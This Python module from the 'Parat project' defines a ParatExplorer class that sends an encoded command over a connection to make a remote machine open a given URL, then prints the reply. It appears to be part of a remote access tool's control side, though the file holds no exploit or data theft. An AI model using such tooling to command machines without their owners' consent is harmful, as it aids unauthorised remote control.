#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from lib.ParatPrint import colorize, pprint
from lib.ParatEncrypt import Encode, Decode

class ParatExplorer:

    def __init__(self, conn, args, colors):

        self.colors  = colors
        self.conn    = conn
        self.args    = args


    def start(self):

        try:

            url = self.args[0]

            if url is not None:

                self.conn.send(Encode("ie<#>" + self.args[0]))
                response = Decode(self.conn.recv(4096))

                if "error" in response:
                    pprint(colorize(response, colored=self.colors, status="ERR"))
                else:
                    pprint(colorize(response, colored=self.colors, status="SUC"))
            else:
                pprint(
                    colorize(
                        " usage: explorer google.com",
                        colored=self.colors,
                        status="INF"
                    ), 1)


        except Exception as e:
            pprint(
                colorize(
                    str(e)+'\n',
                    colored=self.colors,
                    status="ERR"
                ), 1)
